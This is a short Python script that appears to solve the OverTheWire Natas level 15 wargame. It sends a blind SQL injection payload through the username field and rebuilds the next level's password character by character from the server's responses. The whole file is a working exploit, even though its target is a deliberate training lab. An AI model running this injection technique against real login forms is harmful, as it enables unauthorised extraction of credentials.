import string
import sys
import requests

def bruteforce_user_password():

    url = "http://natas15.natas.labs.overthewire.org"

    session = requests.Session()

    auth=("natas15",sys.argv[1])

    response = session.get(url, auth=auth)

    password = ""

    password_chars = list(string.ascii_letters + string.digits)

    while len(password) != 32:

        for char in password_chars:

            data = {
                "username": f"""natas16" and password like binary '{password + char}%'#""" 
            }

            print(f"data : {data}")

            response = session.post(url + "/index.php", auth=auth, data=data)

            if "This user doesn't exist" not in response.text:
                password = password + char

    print(password)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
